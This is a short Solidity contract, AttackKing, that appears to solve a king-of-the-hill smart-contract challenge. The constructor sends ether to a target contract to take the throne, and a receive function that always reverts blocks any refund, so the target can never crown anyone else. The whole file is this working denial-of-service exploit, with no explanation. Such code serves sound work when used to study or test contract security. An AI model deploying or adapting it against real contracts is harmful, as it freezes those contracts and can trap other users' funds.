// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract AttackKing {
    constructor(address target) payable {
        target.call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }
}
